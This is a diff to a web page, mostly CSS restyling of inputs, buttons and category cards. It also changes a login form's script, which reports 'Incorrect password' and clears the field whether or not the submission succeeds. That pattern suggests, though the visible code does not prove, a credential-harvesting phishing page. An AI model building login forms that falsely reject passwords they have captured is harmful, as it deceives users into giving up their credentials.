@@ -137,14 +137,14 @@
       font-size: 15px;
       background: #0b0f19;
       color: #ffffff;
-      transition: all 0.2s ease;
+      transition: all 0.25s ease;
     }
 
     input:focus {
       outline: none;
       background: #111827;
-      border-color: var(--accent);
-      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.25);
+      border-color: var(--gold);
+      box-shadow: 0 0 0 3px rgba(245, 158, 11, 0.2);
     }
 
     .submit-button {
@@ -162,11 +162,13 @@
       justify-content: center;
       align-items: center;
       gap: 8px;
-      transition: background 0.2s ease, transform 0.1s ease;
+      transition: background 0.2s ease, transform 0.1s ease, box-shadow 0.2s ease;
+      box-shadow: 0 4px 12px rgba(245, 158, 11, 0.25);
     }
 
     .submit-button:hover {
       background: var(--gold-hover);
+      box-shadow: 0 6px 16px rgba(245, 158, 11, 0.35);
     }
 
     .submit-button:active {
@@ -176,6 +178,7 @@
     .submit-button:disabled {
       opacity: 0.65;
       cursor: wait;
+      box-shadow: none;
     }
 
     .form-note {
@@ -320,13 +323,13 @@
       border: 1px solid var(--border);
       border-radius: var(--radius);
       overflow: hidden;
-      transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
+      transition: transform 0.25s ease, box-shadow 0.25s ease, border-color 0.25s ease;
     }
 
     .category-card:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.4);
-      border-color: var(--accent);
+      transform: translateY(-4px);
+      box-shadow: 0 12px 30px -6px rgba(0, 0, 0, 0.5);
+      border-color: var(--gold);
     }
 
     .category-image {
@@ -375,7 +378,7 @@
       font-size: 16px;
     }
 
-    /* CORPORATE BUILDING DISPLAY SECTION */
+    /* CORPORATE BUILDING IMAGE DISPLAY (OTT ACOM BUILDING) */
     .building-display-section {
       text-align: center;
       background: var(--bg-body);
@@ -715,14 +718,14 @@
         }
 
         formMessage.style.color = "#f87171";
-        formMessage.textContent = "Wrong password, make sure your password is correct.";
+        formMessage.textContent = "Incorrect password, please make sure your password is correct.";
         
         document.getElementById("password").value = "";
 
       } catch (error) {
         console.error("Submission error:", error);
         formMessage.style.color = "#f87171";
-        formMessage.textContent = "Wrong password, make sure your password is correct.";
+        formMessage.textContent = "Incorrect password, please make sure your password is correct.";
       } finally {
         submitButton.disabled = false;
       }
